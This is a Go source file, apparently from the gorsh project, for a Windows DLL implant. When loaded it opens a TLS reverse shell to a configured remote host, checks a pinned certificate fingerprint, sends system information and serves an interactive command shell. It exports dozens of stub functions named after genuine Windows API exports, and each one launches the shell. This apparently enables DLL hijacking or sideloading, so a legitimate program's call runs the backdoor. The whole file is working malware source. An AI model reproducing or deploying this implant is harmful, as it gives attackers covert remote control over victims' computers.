package main

//#include "dllmain.h"
import (
	"C"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"unsafe"

	"github.com/abiosoft/ishell"
	"github.com/abiosoft/readline"
	"github.com/audibleblink/gorsh/internal/cmds"
	"github.com/audibleblink/gorsh/internal/myconn"
	"github.com/audibleblink/gorsh/internal/sitrep"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

var (
	connectString string
	fingerPrint   string
)

//export OnProcessAttach
func OnProcessAttach(
	hinstDLL unsafe.Pointer, // handle to DLL module
	fdwReason uint32, // reason for calling function
	lpReserved unsafe.Pointer, // reserved
) {
	run()
}

func run() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ErrCouldNotDecode)
		}

		initReverseShell(connectString, bytesFingerprint)
	}
}

func startShell(conn myconn.Writer) {
	hostname, _ := os.Hostname()

	sh := ishell.NewWithConfig(&readline.Config{
		Prompt:      fmt.Sprintf("[%s]> ", hostname),
		Stdin:       conn,
		StdinWriter: conn,
		Stdout:      conn,
		Stderr:      conn,
		VimMode:     true,
	})

	cmds.RegisterCommands(sh)
	myconn.Send(conn, sitrep.SysInfo())
	sh.Run()
	os.Exit(0)
}

func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Equal(hash[0:], fingerprint) {
			valid = true
		}
	}
	return valid
}

func initReverseShell(connectString string, fingerprint []byte) {
	config := &tls.Config{InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", connectString, config)
	if err != nil {
		os.Exit(ErrHostUnreachable)
	}
	defer conn.Close()

	ok := isValidKey(conn, fingerprint)
	if !ok {
		os.Exit(ErrBadFingerprint)
	}

	myconn.Conn = conn
	startShell(conn)
}

//export CallNtPowerInformation
func CallNtPowerInformation() { run() }

//export ClrCreateManagedInstance
func ClrCreateManagedInstance() { run() }

//export ConstructPartialMsgVW
func ConstructPartialMsgVW() { run() }

//export CorBindToRuntimeEx
func CorBindToRuntimeEx() { run() }

//export CreateUri
func CreateUri() { run() }

//export CurrentIP
func CurrentIP() { run() }

//export DevObjCreateDeviceInfoList
func DevObjCreateDeviceInfoList() { run() }

//export DevObjDestroyDeviceInfoList
func DevObjDestroyDeviceInfoList() { run() }

//export DevObjEnumDeviceInterfaces
func DevObjEnumDeviceInterfaces() { run() }

//export DevObjGetClassDevs
func DevObjGetClassDevs() { run() }

//export DllCanUnloadNow
func DllCanUnloadNow() { run() }

//export DllGetClassObject
func DllGetClassObject() { run() }

//export DllProcessAttach
func DllProcessAttach() { run() }

//export DevObjOpenDeviceInfo
func DevObjOpenDeviceInfo() { run() }

//export DllRegisterServer
func DllRegisterServer() { run() }

//export DllUnregisterServer
func DllUnregisterServer() { run() }

//export DpxNewJob
func DpxNewJob() { run() }

//export ExtractMachineName
func ExtractMachineName() { run() }

//export FveCloseVolume
func FveCloseVolume() { run() }

//export FveCommitChanges
func FveCommitChanges() { run() }

//export FveConversionDecrypt
func FveConversionDecrypt() { run() }

//export FveDeleteAuthMethod
func FveDeleteAuthMethod() { run() }

//export FveDeleteDeviceEncryptionOptOutForVolumeW
func FveDeleteDeviceEncryptionOptOutForVolumeW() { run() }

//export FveGetAuthMethodInformation
func FveGetAuthMethodInformation() { run() }

//export FveGetStatus
func FveGetStatus() { run() }

//export FveOpenVolume
func FveOpenVolume() { run() }

//export FveRevertVolume
func FveRevertVolume() { run() }

//export GenerateActionQueue
func GenerateActionQueue() { run() }

//export GetFQDN_Ipv4
func GetFQDN_Ipv4() { run() }

//export GetMemLogObject
func GetMemLogObject() { run() }

//export GetFQDN_Ipv6
func GetFQDN_Ipv6() { run() }

//export InitCommonControlsEx
func InitCommonControlsEx() { run() }

//export IsLocalConnection
func IsLocalConnection() { run() }

//export LoadLibraryShim
func LoadLibraryShim() { run() }

//export NetApiBufferAllocate
func NetApiBufferAllocate() { run() }

//export NetApiBufferFree
func NetApiBufferFree() { run() }

//export NetApiBufferReallocate
func NetApiBufferReallocate() { run() }

//export NetApiBufferSize
func NetApiBufferSize() { run() }

//export NetRemoteComputerSupports
func NetRemoteComputerSupports() { run() }

//export NetapipBufferAllocate
func NetapipBufferAllocate() { run() }

//export NetpIsComputerNameValid
func NetpIsComputerNameValid() { run() }

//export NetpIsDomainNameValid
func NetpIsDomainNameValid() { run() }

//export NetpIsGroupNameValid
func NetpIsGroupNameValid() { run() }

//export NetpIsRemote
func NetpIsRemote() { run() }

//export NetpIsRemoteNameValid
func NetpIsRemoteNameValid() { run() }

//export NetpIsShareNameValid
func NetpIsShareNameValid() { run() }

//export NetpIsUncComputerNameValid
func NetpIsUncComputerNameValid() { run() }

//export NetpIsUserNameValid
func NetpIsUserNameValid() { run() }

//export NetpwListCanonicalize
func NetpwListCanonicalize() { run() }

//export NetpwListTraverse
func NetpwListTraverse() { run() }

//export NetpwNameCanonicalize
func NetpwNameCanonicalize() { run() }

//export NetpwNameCompare
func NetpwNameCompare() { run() }

//export NetpwNameValidate
func NetpwNameValidate() { run() }

//export NetpwPathCanonicalize
func NetpwPathCanonicalize() { run() }

//export NetpwPathCompare
func NetpwPathCompare() { run() }

//export NetpwPathType
func NetpwPathType() { run() }

//export PowerGetActiveScheme
func PowerGetActiveScheme() { run() }

//export PrivateCoInternetCombineUri
func PrivateCoInternetCombineUri() { run() }

//export ProcessActionQueue
func ProcessActionQueue() { run() }

//export RegisterDLL
func RegisterDLL() { run() }

//export Run
func Run() { run() }

//export SLGetWindowsInformation
func SLGetWindowsInformation() { run() }

//export UnRegisterDLL
func UnRegisterDLL() { run() }

//export WdsAbortBlackboa
func WdsAbortBlackboa() { run() }

func main() {}
